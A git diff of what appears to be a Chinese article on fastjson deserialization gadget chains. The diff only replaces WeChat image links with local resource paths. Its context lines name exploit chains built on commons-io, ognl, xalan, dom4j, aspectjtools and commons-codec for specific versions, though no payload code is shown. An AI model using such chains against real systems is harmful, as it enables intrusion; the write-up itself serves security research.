-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDajmkHGS0HVXtv1PsTJuHIz3fxRTgJdmorLfdTJYIzPCzEWyACCDT5Q/640?wx_fmt=png)
+![](../../.resource/remote/258aee001ef19af7d272a8a87013b99ec6c045121bf83617576e29dca65da223.png)
 
 至于为什么会这样，请参考以下文章，写的很清楚很明白，在此不再赘述：
 
@@ -1122,7 +1122,7 @@ public class str2bytes {
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDPTKyhgD9LqLoKOqAW6BMXvkfQXNU5LEETlsKVJfntRk11AH0fnz1SA/640?wx_fmt=png)
+![](../../.resource/remote/c979bf9166314fce58a80845a5eeb5c91f4b5f12bfe3fa29d8c66827a9fff4c4.png)
 
 ### 5.1.3 commons-io 2.7~2.8.0 版本
 
@@ -1136,7 +1136,7 @@ public class str2bytes {
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDj6v6NrxAWfMibP8J4Q1tCKxe5crQ9vFnppMuOibE37yCG2kCR9RFRj6A/640?wx_fmt=png)
+![](../../.resource/remote/066d5d7ad322331f3d1cc51e6daca10180033dd9355a465aea80024a80cfafcf.png)
 
 5.2 ognl+commons-io 2.x（1.2.73<=version<=1.2.80）
 ------------------------------------------------
@@ -1153,7 +1153,7 @@ public class str2bytes {
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwD5QuqVIywv2AL8Xpg5sDiakF4iaAicI3ZLJj4pADOycZRNNsnyWg8A17UQ/640?wx_fmt=png)
+![](../../.resource/remote/9121db15e09628d1df61540e314526ed121543f2ac55d47ca8ce1395345199ec.png)
 
 ### 5.2.2 ognl+commons-io 2.7~2.8 版本
 
@@ -1165,7 +1165,7 @@ public class str2bytes {
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDam2xP77Pia24uJBvoFW0np8HCohCAP5ic9wVxoqQax0TyZwU7ibJqbOOg/640?wx_fmt=png)
+![](../../.resource/remote/0234d4663a6bc90470e4868d4aa6b34629b3f6210ce0bd05001e7df8e1db6db9.png)
 
 ### 5.2.3 ognl+commons-io+aspectjtools+commons-codec 组合利用链
 
@@ -1206,7 +1206,7 @@ public class str2bytes {
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDL5iann7ibVvicfiadsd3QISZyAlssFK2buvaGPcicqJZOUVHiadSTrKrLicXA/640?wx_fmt=png)
+![](../../.resource/remote/a92e5464857eb265815d7a0c962f427bcb2eb584d9966f027f5f181f76834761.png)
 
 ### 5.3.2 xalan+dom4j+commons-io（2.7~2.8 版本）
 
@@ -1238,7 +1238,7 @@ public class str2bytes {
 
 ```
 
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12o72XS62tn9nvlibiage21NwDQbic2cbe11DkNc5TlIn78InGTtnJB4UmuiciaqpEfLIFoiaibGc1oVYqmfQ/640?wx_fmt=png)
+![](../../.resource/remote/c0a9b61e93ce4932077e0dbdfbf805b16e2130072b342da58bd23ccc9c374d74.png)
 
 ### 5.3.3 xalan+dom4j+commons-io+aspectjtools+commons-codec 组合利用链
 
